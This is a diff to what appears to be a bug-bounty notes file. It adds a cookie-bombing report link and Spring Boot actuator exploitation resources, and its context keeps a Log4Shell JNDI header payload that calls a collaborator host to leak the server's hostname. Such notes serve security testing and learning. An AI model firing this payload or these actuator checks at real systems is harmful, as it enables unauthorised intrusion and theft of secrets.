@@ -373,6 +373,9 @@ Ways of injecting OS commands
 - Account Takeover via type confusion
   - Play with parameters and flags to see if you can achieve ATO
 
+Other cases:
+- Cookie Bombing
+  - [Report #1898305](https://hackerone.com/reports/1898305)
 
 ## Information Disclosure
 
@@ -1663,10 +1666,14 @@ Resources:
 - Payload: `Referer: ${jndi:ldap://h${hostname}.BURPCOLLABORATOR/s2test}`
 
 
-
 ## Spring Boot
 
 - Check `/env` for RCE, `/heapdump` for private keys
 - Check also `/jolokia`
+
+Resources
+- [LandGrey/SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit)
+- [Remote Code Execution in Three Acts: Chaining Exposed Actuators and H2 Database Aliases in Spring Boot 2](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)
+- [Memory Analyzer (MAT)](https://eclipse.dev/mat/) (for analyzing `/heapdump`)
 
 
